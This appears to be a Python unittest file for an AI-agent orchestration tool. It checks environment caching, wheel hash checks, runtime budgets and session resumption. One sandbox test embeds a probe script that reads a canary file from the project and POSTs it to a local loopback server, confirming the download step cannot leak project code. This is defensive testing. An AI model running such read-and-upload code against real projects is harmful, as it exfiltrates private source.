"""Independent failure-boundary probes using only synthetic local data."""
import asyncio
import hashlib
import http.server
from pathlib import Path
import tempfile
import threading
from types import SimpleNamespace
import unittest
from unittest.mock import patch
from uuid import uuid4
import zipfile

from parallax.budget import ExecutionBudget
from parallax.connections import ConnectionRegistry
from parallax.engine import Engine
from parallax.models import CheckSpec, Participant, RunResult, RunSpec, TaskSpec
from parallax.store import Store
from parallax.workspaces import WorkspaceManager
from test_engine import FakeRegistry, git


class IndependentProvisioningTests(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        self.directory = tempfile.TemporaryDirectory(prefix="parallax-independent-")
        self.root = Path(self.directory.name).resolve()
        self.project = self.root / "project"
        self.project.mkdir()
        self.store = Store(self.root / "state")
        self.engine = Engine(self.store, registry=object(), memory=False)
        self.identifier = str(uuid4())
        self.run = self.store.home / "runs" / self.identifier
        self.run.mkdir(parents=True)
        spec = RunSpec(workspace=str(self.project), prompt="Synthetic dependency checks", mode="review")
        value = RunResult(run_id=self.identifier, status="running", spec=spec).model_dump()
        value["artifacts"]["directory"] = str(self.run)
        self.store.save(value)
        self.engine.cancel_flags[self.identifier] = asyncio.Event()
        self.wheel = self.project / "independent_probe_dep-1.0-py3-none-any.whl"
        self.manifest = self.project / "requirements.txt"
        self.checks = [CheckSpec(name="characterization", argv=["python", "-m", "unittest"])]

    async def asyncTearDown(self):
        self.store.close()
        self.directory.cleanup()

    def write_wheel(self, value):
        prefix = "independent_probe_dep-1.0.dist-info/"
        files = {
            "independent_probe_dep.py": "VALUE=" + repr(value) + "\n",
            prefix + "METADATA": "Metadata-Version: 2.1\nName: independent-probe-dep\nVersion: 1.0\n",
            prefix + "WHEEL": "Wheel-Version: 1.0\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
        }
        files[prefix + "RECORD"] = "\n".join(name + ",," for name in [*files, prefix + "RECORD"]) + "\n"
        with zipfile.ZipFile(self.wheel, "w") as archive:
            for name, content in files.items():
                archive.writestr(name, content)

    async def installed_value(self, python):
        outcome = await self.engine._command(self.identifier,
            [str(python), "-B", "-c", "import independent_probe_dep; print(independent_probe_dep.VALUE)"],
            self.project, {"PATH": "/usr/bin:/bin", "HOME": str(self.run)}, 10,
            readable=[python.parent.parent], network=False)
        self.assertEqual(outcome.exit_code, 0, outcome.stderr)
        self.assertFalse(outcome.failure)
        return outcome.stdout.strip()

    async def test_changed_vendored_wheel_with_same_manifest_checks_new_bytes(self):
        self.write_wheel(7)
        self.manifest.write_text("--no-index\n./" + self.wheel.name + "\n")
        _, first = await asyncio.wait_for(self.engine._ensure_environment(
            self.identifier, self.project, self.checks), 30)
        self.assertEqual(await self.installed_value(first), "7")
        unchanged_manifest = self.manifest.read_bytes()
        self.write_wheel(8)
        self.assertEqual(self.manifest.read_bytes(), unchanged_manifest)
        _, second = await asyncio.wait_for(self.engine._ensure_environment(
            self.identifier, self.project, self.checks), 30)
        self.assertNotEqual(first, second, "Changed dependency bytes must invalidate a ready environment")
        self.assertEqual(await self.installed_value(second), "8")

    async def test_cached_environment_does_not_hide_declared_wheel_hash_mismatch(self):
        self.write_wheel(7)
        digest = hashlib.sha256(self.wheel.read_bytes()).hexdigest()
        self.manifest.write_text("--no-index\n./" + self.wheel.name + " --hash=sha256:" + digest + "\n")
        await asyncio.wait_for(self.engine._ensure_environment(self.identifier, self.project, self.checks), 30)
        self.write_wheel(9)
        with self.assertRaisesRegex(ValueError, "hash mismatch"):
            await self.engine._ensure_environment(self.identifier, self.project, self.checks)

    async def test_actual_download_command_cannot_read_project_with_network_enabled(self):
        # Exercise the actual Engine-selected download sandbox and cwd. Only
        # a synthetic project file and a disposable loopback server are used.
        secret = self.project / "confidential-code.txt"
        secret.write_bytes(b"SYNTHETIC_PROJECT_CANARY")
        received = []
        class Handler(http.server.BaseHTTPRequestHandler):
            def do_POST(self):
                received.append(self.rfile.read(int(self.headers["Content-Length"])))
                self.send_response(200)
                self.end_headers()
            def log_message(self, *_):
                pass
        server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        self.write_wheel(7)
        self.manifest.write_text("--no-index\n./" + self.wheel.name + "\n")
        command = self.engine._command
        downloads = []
        async def observe(run_id, argv, workspace, env, timeout, **kwargs):
            if "download" in argv:
                self.assertTrue(kwargs["network"])
                self.assertNotEqual(workspace, self.project)
                self.assertNotIn(self.project, kwargs["readable"])
                # Seatbelt refuses reads; Linux's isolated mount namespace hides
                # the project entirely. Both must prevent the same exfiltration.
                self.assertEqual(secret.read_bytes(), b"SYNTHETIC_PROJECT_CANARY")
                probe = "from pathlib import Path\nimport urllib.request\ntry:\n data=Path(" + repr(str(secret)) + ").read_bytes()\nexcept (PermissionError, FileNotFoundError):\n print('PROJECT_READ_BLOCKED')\nelse:\n urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:" + str(server.server_port) + "/',data=data),timeout=2)\n"
                outcome = await command(run_id, [argv[0], "-I", "-c", probe], workspace, env, 10, **kwargs)
                self.assertEqual(outcome.exit_code, 0, outcome.stderr)
                self.assertEqual(outcome.stdout.strip(), "PROJECT_READ_BLOCKED")
                downloads.append(workspace)
            return await command(run_id, argv, workspace, env, timeout, **kwargs)
        self.engine._command = observe
        await asyncio.wait_for(self.engine._ensure_environment(self.identifier, self.project, self.checks), 30)
        self.assertEqual(len(downloads), 1)
        self.assertEqual(received, [])


class IndependentBudgetTests(unittest.TestCase):
    def test_recovery_never_reduces_durable_used_even_if_it_exceeds_limit(self):
        with tempfile.TemporaryDirectory(prefix="parallax-independent-budget-") as directory:
            root = Path(directory)
            store = Store(root / "state")
            self.addCleanup(store.close)
            with patch("parallax.budget.boot_identity", return_value="boot"):
                budget = ExecutionBudget(store)
            identifier = str(uuid4())
            # Graceful timeout cleanup may take a run slightly over its limit.
            # Stale artifact saves must never erase that durable consumed floor.
            with patch("parallax.budget.time.monotonic", return_value=100):
                budget.begin(identifier, 61, 60)
            result = RunResult(run_id=identifier, status="interrupted",
                spec=RunSpec(workspace=str(root), prompt="Synthetic budget", mode="review")).model_dump()
            result["artifacts"]["runtime_seconds"] = 0
            with patch("parallax.budget.time.monotonic", return_value=101):
                budget.recover(result)
            self.assertGreaterEqual(result["artifacts"]["runtime_seconds"], 61)


class IndependentSessionTests(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        self.directory = tempfile.TemporaryDirectory(prefix="parallax-independent-session-")
        self.root = Path(self.directory.name).resolve()
        self.project = self.root / "project"
        self.project.mkdir()
        for args in (("init", "-q"), ("config", "user.name", "Synthetic"),
                     ("config", "user.email", "synthetic@example.invalid")):
            git(self.project, *args)
        (self.project / "maths.py").write_text("def add(a,b):\n return a-b\n")
        (self.project / "check.py").write_text("from maths import add\nassert add(2,3)==5\n")
        git(self.project, "add", ".")
        git(self.project, "commit", "-qm", "synthetic baseline")
        self.store = Store(self.root / "state")
        self.identifier = str(uuid4())
        self.spec = RunSpec(workspace=str(self.project), prompt="Fix addition", mode="build",
            team=[Participant(provider="claude"), Participant(provider="grok", role="reviewer")],
            checks=[CheckSpec(name="Addition", argv=["python", "-B", "check.py"])])
        value = RunResult(run_id=self.identifier, status="interrupted", spec=self.spec).model_dump()
        self.run = self.store.home / "runs" / self.identifier
        value["artifacts"] = {"directory": str(self.run), "runtime_seconds": 12,
            "user_checks": [check.model_dump() for check in self.spec.checks]}
        self.store.save(value)
        self.manager = WorkspaceManager(self.project, self.run)
        self.manager.prepare()
        self.worker = self.manager.create_worker("fix-1")

    async def asyncTearDown(self):
        self.store.close()
        self.directory.cleanup()

    async def test_native_wrapper_recovery_keeps_checkout_attempt_and_budget_but_new_conversation(self):
        observed = {}
        class BoundedNative(FakeRegistry):
            native_session_resume = False
            async def run(self, provider, **kwargs):
                if kwargs["mode"] == "edit":
                    observed.update(workspace=kwargs["workspace"], session=kwargs.get("session_id"))
                    self_before = (kwargs["workspace"] / "maths.py").read_text()
                    observed["preserved_partial"] = "SAVED_PARTIAL" in self_before
                return await super().run(provider, **kwargs)
        native = BoundedNative()
        wrapper = ConnectionRegistry(self.store, native=native, vault=object())
        engine = Engine(self.store, wrapper, memory=False)
        engine.cancel_flags[self.identifier] = asyncio.Event()
        (self.worker / "maths.py").write_text("# SAVED_PARTIAL\ndef add(a,b):\n return a-b\n")
        task = {**TaskSpec(id="fix", title="Fix addition", provider="claude", prompt="Fix addition", files=["maths.py"]).model_dump(),
            "status": "interrupted", "attempts": 1,
            "active_attempt": {"number": 1, "worker_id": "fix-1", "workspace": str(self.worker),
                "participant": self.spec.team[0].model_dump(), "state": "running"}}
        value = self.store.get(self.identifier)
        value["tasks"] = [task]
        value["sessions"] = [{"task_id": "fix", "provider": "claude", "transport": "cli", "connection_id": None,
            "workspace": str(self.worker), "mode": "edit", "session_id": str(uuid4()),
            "requested_settings": {"model": None, "effort": "high"},
            "effective_settings": {"model": "fake", "effort": "high"}}]
        self.store.save(value)
        self.assertIsNone(engine._resume_session(self.identifier, "fix", self.worker, self.spec.team[0], "edit", attempt=1))
        outcome = await engine._worker(self.identifier, self.spec, self.manager, task)
        self.assertTrue(outcome["ok"], outcome)
        self.assertEqual(observed, {"workspace": self.worker, "session": None, "preserved_partial": True})
        saved = self.store.get(self.identifier)
        self.assertEqual(saved["tasks"][0]["attempts"], 1)
        self.assertEqual(saved["artifacts"]["runtime_seconds"], 12)

    async def test_native_no_resume_policy_does_not_disable_identity_bound_api_journal(self):
        wrapper = ConnectionRegistry(self.store, native=SimpleNamespace(native_session_resume=False), vault=object())
        engine = Engine(self.store, wrapper, memory=False)
        member = Participant(provider="custom", transport="api", connection_id="chosen", model="custom-model", effort=None)
        session = "api-" + str(uuid4())
        self.store.event(self.identifier, "provider", {"type": "api.session", "session_id": session,
            "provider": "custom", "workspace": str(self.worker), "mode": "edit", "transport": "api",
            "connection_id": "chosen", "effective_settings": {"model": "custom-model", "effort": None}}, "api-task")
        self.assertEqual(engine._resume_session(self.identifier, "api-task", self.worker, member, "edit")["session_id"], session)
        self.assertIsNone(engine._resume_session(self.identifier, "api-task", self.worker,
            member.model_copy(update={"connection_id": "foreign"}), "edit"))


if __name__ == "__main__":
    unittest.main()
